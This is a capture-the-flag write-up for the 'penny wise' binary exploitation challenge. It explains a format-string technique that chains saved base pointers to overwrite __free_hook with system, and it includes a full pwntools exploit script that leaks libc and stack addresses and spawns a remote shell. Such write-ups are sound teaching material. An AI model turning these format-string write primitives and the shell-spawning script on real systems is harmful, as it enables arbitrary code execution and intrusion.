# penny wise

Disclaimer: Solved after the competition.

I didn't manage to solve this during the event, however, I wanted to explore a format string vulnerability someone pointed out afterwards.
While the inclusion of this vulnerability was unintentional, I was curious as to whether or not it could be solved with just `printf`.

Turns out, it can.

This challenge also let me test some ideas I had about `printf` exploits.

## Description

Thou shalt not extremely waste memory!

N.B. In case you’re wondering libc is 2.27.

## Challenge

We're given a program that allows the user to create, view, edit, and delete records through an interactive command prompt.

```
-> % ./bin
Welcome!

[S]tore record
[R]eturn record
[U]pdate content
[M]odify title
[D]elete record
[P]rint all
[Q]uit
```

 - Store record: creates a record with a given title and content.
 - Return record: prints the content of a record.
 - Update content: changes the content of a record.
 - Modify title: changes the title of a record.
 - Delete record: removes a record.
 - Print all: prints the title and content of all currently saved records.
 - Quit: exits the program.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Intended solution

The program handles user input differently depending on the length of the string.
Only sufficiently long strings are stored on the heap, otherwise they are stored on the stack.
The program determines whether to use the stack or heap later by saving metadata to the least significant byte.

There is an off-by-one bug in the function that saves the title of a record.
This can be used to overwrite the least significant byte of content when content is stored on the stack.
This allows us to write anything we want to the stack and treat it as a pointer rather than a `char` array.

As we can define the value of this pointer, we can read and write to arbitrary locations.
This allows us to overwrite `__free_hook` to call `system`, then free a record containing a shell command such as `/bin/sh`.

See [Daniele Pusceddu's writeup](https://danielepusceddu.github.io/ctf_writeups/volgaqualifiers21_pennywise/) for a detailed explanation of this solution.

## printf solution

By storing a single page and updating its contents, we can send anything we want to `printf` as many times as we need.

User input is never stored on the stack if it is a qword or longer, otherwise it is stored on the heap.
So we can't write our own addresses to the stack.

The stack contains a linked list of saved base pointers.
These will point to known locations on the stack relative to the current callstack.
In other words, we always know how far the subjects of these pointers are from $rsp$.
We can therefore use these values to write an arbitrary value to a known location on the stack.

```
rbp: A

...
A: B
...
B: C
...
C: ???
```

A, B, and C are stored `rbp` values which point to each other.
We can use B to write a word known location on the stack (C) using the `%hn` format specifier.

We can now use A to overwrite the least significant byte of B so that it points at C+2.
Now we can use the new value of B to write another word to C+2.

By repeating this method, we can put any values we want on the stack, as long as the addresses we write to are not used in the execution loop.
Note that it is ok if the program uses A or B in its loop, as A is not changed and it is possible to reset B after every write in the same `printf` call.

Using this technique, we can write the address of `__free_hook` onto the stack 4 times, each offset by 2.
This will allow us to overwrite freehook in 4 short writes using a single `printf` call, which is important for avoiding the use of `free` while `__free_hook` does not point to a valid function address.

First, we store a page with the contents of our shell command (`//bin/sh\x00`).
Next, we overwrite `__free_hook` to point at system.
Now, when we delete the record containing our shell command, it will execute `system('//bin/sh')` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host 139.162.160.184 --port 19999 bin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bin')
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.162.160.184'
port = int(args.PORT or 19999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal = ['tmux', 'splitw', '-v']
gdbscript = '''
b*0x7ffff7bcfd95
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled



def Store(title, content):
    io.sendlineafter('[Q]uit\n', 'S')
    io.sendlineafter('title\n', title)
    io.sendlineafter('content\n', content)

def Return(title):
    io.sendlineafter('[Q]uit\n', 'R')
    io.sendlineafter('title\n', title)

def Update(title, content):
    io.sendlineafter('[Q]uit\n', 'U')
    io.sendlineafter('title\n', title)
    io.sendlineafter('content\n', content)

def Delete(title):
    io.sendlineafter('[Q]uit\n', 'D')
    io.sendlineafter('title\n', title)

def buildStackAddr(offset, word):
    lsw = (stackaddr + 8 + offset) % 0x10000
    written = 0
    fmtstr = ''

    fmtstr += '%2hhx' * 14
    written += 14*2
    fmtstr += '%' + str((lsw - written) % 0x10000 + 0x10000) + 'hhx'
    written += (lsw - written) % 0x10000
    fmtstr += '%hn'

    fmtstr += '%2hhx' * 4
    written += 4*2
    fmtstr += '%' + str((word - written) % 0x10000 + 0x10000) + 'hhx'
    written += (word - written) % 0x10000
    fmtstr += '%hn'

    #proof of concept: reset stack to original state
    '''
    fmtstr += '%' + str((0x69 - written) % 0x10000 + 0x10000) + 'hhx'
    written += (0x69 - written) % 0x10000
    fmtstr += '%16$hn'
    '''

    Update('writer', fmtstr)
    Return('writer')

    io.success("wrote stack word: " + hex(word) + " to offset: " + hex(offset))

io = start()
pause()



Store('leaklib', '%45$p aaaaaaaa')
Return('leaklib')

leaklib = io.recvline().decode().split(' ')[0]
libc.address = int(leaklib, 0) - 0x021bf7
io.success("Libc address: " + hex(libc.address))



Store('leakstk', '%22$p aaaaaaaa')
Return('leakstk')

leakstk = io.recvline().decode().split(' ')[0]
stackaddr = int(leakstk, 0)
io.success("Stack address: " + hex(stackaddr))

Store("writer", "paaaaaaaaaaaaaad")



freeHook = libc.sym['__free_hook']
io.success("free hook at: " + hex(freeHook))
freeHook0 = libc.sym['__free_hook'] % 0x10000
freeHook2 = (libc.sym['__free_hook'] // 0x10000) % 0x10000
freeHook4 = (libc.sym['__free_hook'] // 0x100000000) % 0x10000
freeHook6 = (libc.sym['__free_hook'] // 0x1000000000000) % 0x10000

buildStackAddr(0, freeHook0)
buildStackAddr(2, freeHook2)
buildStackAddr(4, freeHook4)
buildStackAddr(6, freeHook6)

buildStackAddr(8, freeHook0 + 2)
buildStackAddr(10, freeHook2)
buildStackAddr(12, freeHook4)
buildStackAddr(14, freeHook6)

buildStackAddr(16, freeHook0 + 4)
buildStackAddr(18, freeHook2)
buildStackAddr(20, freeHook4)
buildStackAddr(22, freeHook6)

buildStackAddr(24, freeHook0 + 6)
buildStackAddr(26, freeHook2)
buildStackAddr(28, freeHook4)
buildStackAddr(30, freeHook6)



system = libc.sym["system"]
io.success("system at: " + hex(system))

system0 = system % 0x10000
system2 = (system // 0x10000) % 0x10000
system4 = (system // 0x100000000) % 0x10000
system6 = (system // 0x1000000000000) % 0x10000

written = 0
fmtstr = ''

Store('shell', '//bin/sh\x00')

if(system0 > 0):
    fmtstr += '%' + str((system0 - written) % 0x10000) + 'hhx'
    written += (system0 - written) % 0x10000
    fmtstr += '%45$hn'

if(system2 > 0):
    fmtstr += '%' + str((system2 - written) % 0x10000) + 'hhx'
    written += (system2 - written) % 0x10000
    fmtstr += '%46$hn'

if(system4 > 0):
    fmtstr += '%' + str((system4 - written) % 0x10000) + 'hhx'
    written += (system4 - written) % 0x10000
    fmtstr += '%47$hn'

if(system6 > 0):
    fmtstr += '%' + str((system6 - written) % 0x10000) + 'hhx'
    written += (system6 - written) % 0x10000
    fmtstr += '%48$hn'

Update('writer', fmtstr)
Return('writer')



Delete('shell')

io.interactive()
```

